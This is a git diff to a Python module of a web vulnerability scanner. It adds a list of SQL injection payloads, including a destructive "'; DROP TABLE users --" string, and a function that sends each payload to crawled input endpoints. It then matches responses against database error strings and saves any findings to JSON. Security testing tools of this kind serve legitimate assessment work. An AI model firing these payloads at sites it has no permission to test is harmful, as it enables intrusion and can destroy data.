@@ -1,5 +1,28 @@
 from crawler.selenium_crawler import SeleniumCrawler
 import requests
+import json, os
+
+SQL_PAYLOADS = [
+    "'",
+    "' OR '1'='1",
+    "' OR 1=1 --",
+    '" OR "1"="1',
+    "' UNION SELECT null,null,null --",
+    "'; DROP TABLE users --",
+    "1' AND '1'='1",
+    "' OR 'x'='x",
+    "admin'--",
+    "' OR 1=1#",
+]
+
+DB_ERRORS = [
+    "sql syntax", "mysql_fetch", "ora-", "syntax error",
+    "unclosed quotation", "sqlite", "postgresql", "jdbc",
+    "odbc", "microsoft sql", "warning: mysql", "invalid query",
+    "you have an error in your sql", "sqlstate",
+    "pg_query", "mysql_num_rows", "division by zero",
+]
+
 
 GENERIC_INPUT_PATHS = [
     "/search", "/search?q=test", "/?s=test", "/?q=test",
@@ -59,15 +82,57 @@ def collect_input_endpoints(base_url, crawl_results):
             pass
     return endpoints
 
+def test_sqli(endpoint):
+    url    = endpoint["url"]
+    method = endpoint["method"]
+    inputs = endpoint["inputs"]
+
+    for payload in SQL_PAYLOADS:
+        try:
+            if method == "GET":
+                resp = requests.get(
+                    url, params={field: payload for field in inputs}, timeout=10
+                )
+            else:
+                resp = requests.post(
+                    url, json={field: payload for field in inputs}, timeout=10
+                )
+
+            body    = resp.text.lower()
+            matched = [e for e in DB_ERRORS if e in body]
+
+            if matched:
+                return {
+                    "type":     "SQL Injection",
+                    "url":      url,
+                    "severity": "Critical",
+                    "detail":   f"SQL Injection CONFIRMED via payload '{payload}'. DB error: '{matched[0]}'",
+                }
+        except Exception as e:
+            print(f"[sql_injection] Error on {url}: {e}")
+
+    return {
+        "type":     "SQL Injection",
+        "url":      url,
+        "severity": "Medium",
+        "detail":   f"Tested {len(SQL_PAYLOADS)} payloads — no DB error detected.",
+    }
+
+
 
 def scan(url):
     crawler = SeleniumCrawler(url, max_pages=15)
     crawl_results = crawler.crawl()
     endpoints = collect_input_endpoints(url, crawl_results) 
     print(f"[sql_injection] Found {len(endpoints)} input endpoints")
-    return [{
-        "type": "SQL Injection", "url": ep["url"],
-        "severity": "Info",
-        "detail": (f"Input endpoint via {ep['source']}. "
-                   f"Fields: {ep['inputs']}")
-    } for ep in endpoints]
+    findings = [test_sqli(ep) for ep in endpoints]
+    critical = sum(1 for f in findings if f["severity"] == "Critical")
+    print(f"[sql_injection] Critical: {critical} / {len(findings)}")
+
+    # critical_findings = [f for f in findings if f["severity"] == "Critical"]
+
+    os.makedirs("results", exist_ok=True)
+    with open("results/sql_injection_results.json", "w") as f:
+        json.dump(findings, f, indent=2)
+    print(f"[sql_injection] Results saved to results/sql_injection_results.json")
+    return findings
